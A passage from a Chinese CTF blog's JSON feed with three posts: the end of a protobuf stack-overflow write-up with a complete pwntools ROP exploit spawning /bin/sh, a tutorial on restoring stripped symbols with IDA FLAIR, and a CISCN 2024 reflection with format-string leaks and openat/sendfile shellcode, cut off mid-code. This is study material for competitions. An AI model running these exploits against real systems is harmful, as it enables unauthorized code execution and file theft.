alt=\"image-20240628102847682\"></p>\n<p>这样我们就可以成功的去执行了</p>\n<h3 id=\"寻找漏洞\"><a class=\"markdownIt-Anchor\" href=\"#寻找漏洞\">#</a> 寻找漏洞</h3>\n<p><img data-src=\"/img/protocol/image-20240628103148873.png\" alt=\"image-20240628103148873\"></p>\n<p>n [0] 是我们输入 buf 的大小，n [1] 是我们输入的内容。而前面可以设置最大为 0x1000 很明显有栈溢出漏洞。</p>\n<p>给出给的 puts 函数的地址，构造合理的 rop 或者 one_gadget（后来发现 one_gadget 没有相应的条件</p>\n<p>完整 exp 如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Gift: 0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>puts_libc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvn<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_libc <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002164f</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ret <span class=\"token operator\">=</span> rdi <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f29e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f2a5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f302</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a2fc</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x218</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "栈劫持",
                "protocol"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/06/27/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B2/",
            "url": "https://yhuanhuan01.github.io/2024/06/27/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B2/",
            "title": "关于恢复符号表这件事2",
            "date_published": "2024-06-27T10:35:30.000Z",
            "content_html": "<h1 id=\"关于恢复符号表这件事2\"><a class=\"markdownIt-Anchor\" href=\"#关于恢复符号表这件事2\">#</a> 关于恢复符号表这件事 2</h1>\n<p>前言</p>\n<blockquote>\n<p>由于 rizzo 恢复符号表真滴一言难尽，于是重拾之前如何恢复符号表这个任务</p>\n</blockquote>\n<p>在这个阶段，鄙人确实找到了一个办法去进行符号表恢复</p>\n<p>使用 FLAIR，由于网上的资料晦涩难懂，于是鄙人打算亲自写一篇去自己去理解</p>\n<h2 id=\"flair\"><a class=\"markdownIt-Anchor\" href=\"#flair\">#</a> FLAIR</h2>\n<blockquote>\n<p>flair 通过对库文件中的函数生成签名，并生成对应的签名文件，然后和程序中的函数进行签名匹配找到匹配的函数来帮助我们还原库函数。</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627180330677.png\" alt=\"image-20240627180330677\"></p>\n<p>这是此项目需要用到的 linux 文件，因为鄙人习惯使用 linux 系统，所以会用 linux 系统下的 elf 文件用法去讲解</p>\n<p>先给出一篇网上的<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDQ4ND90aW1lX18xMzExPW40JTJCeG5EMEQ5RGdEdUQwMkJpRCUyRmplMCUzRGVJb3ZhaVFEbXhSckQmYW1wO2FsaWNobGdyZWY9aHR0cHMlM0ElMkYlMkZ3d3cuZ29vZ2xlLmNvbSUyRg==\">文章</span></p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627180549231.png\" alt=\"image-20240627180549231\"></p>\n<p>这篇文章使用的是 libc.a，鄙人在使用这个文件时，会生成 pat 文件，但是并不是 pat 文件。也就是说它生成 pat 的文件是错误的 pat 文件，而且它也是使用的 libc.a 文件，说明你需要网上去找（不好寻找，另一种方法是下载此类系统，我想是个聪明人都会觉得这是小题大作了吧。</p>\n<p>由此鄙人寻找另外一种办法去配合 sigmake 文件去生成 sig 文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hbmRpYW50L2ZsYXJlLWlkYS90cmVlL21hc3Rlcg==\">https://github.com/mandiant/flare-ida/tree/master</span></p>\n<p>项目连接在上面</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627181108547.png\" alt=\"image-20240627181108547\"></p>\n<p>使用的 ida 脚本如上，只需要将 libc.so.6 文件拖入 IDA 只用，然后使用 IDA 脚本，就会生成 pat 程序。</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627181227878.png\" alt=\"image-20240627181227878\"></p>\n<p>接下来在使用 sigmake 生成符号表即可</p>\n<p>如果生成 err 文件，我们需要在 exc 删除前面几句话再次执行一次 sigmake 即可</p>\n<h2 id=\"效果演示\"><a class=\"markdownIt-Anchor\" href=\"#效果演示\">#</a> 效果演示</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token operator\">-</span>s <span class=\"token operator\">-</span><span class=\"token keyword\">static</span> a<span class=\"token punctuation\">.</span>c <span class=\"token operator\">-</span>o test</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, World!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"未加符号表之前\"><a class=\"markdownIt-Anchor\" href=\"#未加符号表之前\">#</a> 未加符号表之前</h3>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627181833052.png\" alt=\"image-20240627181833052\"></p>\n<h3 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h3>\n<h5 id=\"生成pat文件\"><a class=\"markdownIt-Anchor\" href=\"#生成pat文件\">#</a> 生成 pat 文件</h5>\n<p>首先拿到相关程序版本的 libc.so.6 文件，放入 ida 中</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182157239.png\" alt=\"image-20240627182157239\"></p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182240476.png\" alt=\"image-20240627182240476\"></p>\n<h5 id=\"生成sig文件\"><a class=\"markdownIt-Anchor\" href=\"#生成sig文件\">#</a> 生成 sig 文件</h5>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182335363.png\" alt=\"image-20240627182335363\"></p>\n<blockquote>\n<p>./sigmake libc-2.27.pat libc-2.27.sig</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182446012.png\" alt=\"image-20240627182446012\"></p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182511242.png\" alt=\"image-20240627182511242\"></p>\n<p>删掉所选内容</p>\n<p>再次生成 sigmake 文件</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182556888.png\" alt=\"image-20240627182556888\"></p>\n<p>此时就生成了 sig。</p>\n<h5 id=\"恢复符号表\"><a class=\"markdownIt-Anchor\" href=\"#恢复符号表\">#</a> 恢复符号表</h5>\n<p>将其放进 sig 下的 pc 下</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182712207.png\" alt=\"image-20240627182712207\"></p>\n<p>在要恢复符号的程序下按下 <code>shift + F5</code></p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182830901.png\" alt=\"image-20240627182830901\"></p>\n<p>导入符号表</p>\n<p>双击即可</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182920891.png\" alt=\"image-20240627182920891\"></p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627182950032.png\" alt=\"image-20240627182950032\"></p>\n<p>加符号表之后</p>\n<p><img data-src=\"/img/%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8/image-20240627183127161.png\" alt=\"image-20240627183127161\"></p>\n<p>可见恢复的还是比较多</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B1c2gwZWJwL3NpZy1kYXRhYmFzZQ==\">https://github.com/push0ebp/sig-database</span></p>\n",
            "tags": [
                "技巧"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/",
            "url": "https://yhuanhuan01.github.io/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/",
            "title": "2024Ciscn国赛心得",
            "date_published": "2024-06-25T13:17:42.000Z",
            "content_html": "<h1 id=\"2024ciscn国赛心得\"><a class=\"markdownIt-Anchor\" href=\"#2024ciscn国赛心得\">#</a> 2024Ciscn 国赛心得</h1>\n<blockquote>\n<p>前言</p>\n</blockquote>\n<pre><code>今年总的来说，pwn方向两道题都不是很难。虽然一道都没给做出来。还是由于经验不足导致的吧。首先第一道pwn的话，在本地是能读取到flag文件，但是远程就是不能去读取flag，线下询问了一个华东北第二名队伍的pwn师傅，才知道远程打开flag的fd并不是3，而是5，是openat的rax的值，真是学到了不少东西。第二道是将符号表全都去掉，因为第一题一直以为是栈的问题在不断调试，导致第二题光fix并没有去做。\n</code></pre>\n<h3 id=\"pwn_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn_1\">#</a> pwn_1</h3>\n<h5 id=\"fix\"><a class=\"markdownIt-Anchor\" href=\"#fix\">#</a> fix</h5>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180143222.png\" alt=\"image-20240625180143222\"></p>\n<p>将 0x80-&gt; 改为 0x50 即可</p>\n<h5 id=\"break\"><a class=\"markdownIt-Anchor\" href=\"#break\">#</a> break</h5>\n<p>NX 关闭，栈可执行，往栈上写入 shellcode，利用格式化字符串，泄露 stack 地址，从而控制返回地址返回到 shellcode 处。</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180959807.png\" alt=\"image-20240625180959807\"></p>\n<p>禁用 open、readv、writev、和 exev 系列。</p>\n<p>可以利用 openat、read、write、sendfile。</p>\n<p>可惜一直忘记用 read、write。以为是栈的问题，结果是远程的 fd 和本地的 fd 不一样导致的。</p>\n<p><img data-src=\"/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625181146191.png\" alt=\"image-20240625181146191\"></p>\n<p>利用格式化字符串泄露 canary 和 stack 的地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%25$p'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x118</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span></pre></td></tr></table></figure><p>接下来 ret2shellcode 就行</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>openat<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"flag\\x00\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>sendfile<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rax'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#fd 要是 rax 不能是 3，否则读不到远程 flag</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'->set name\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>下面是自己写的 openat + read + write 的汇编。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpush 0x67616c66</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tmov rsi, rsp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpush -0x64</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tpop rdi</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\txor edx, edx</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tmov eax, 257</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tmov edi, eax</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tmov rsi, &#123;&#125;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tmov edx, 0x40</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\txor eax, eax</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tmov edi, 1</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tmov rsi, &#123;&#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tmov edx, 0x40</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tmov eax, 1</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pl <span class=\"token operator\">=</span> shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'2: get name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>dug<span class=\"token punctuation\">(</span><span class=\"token 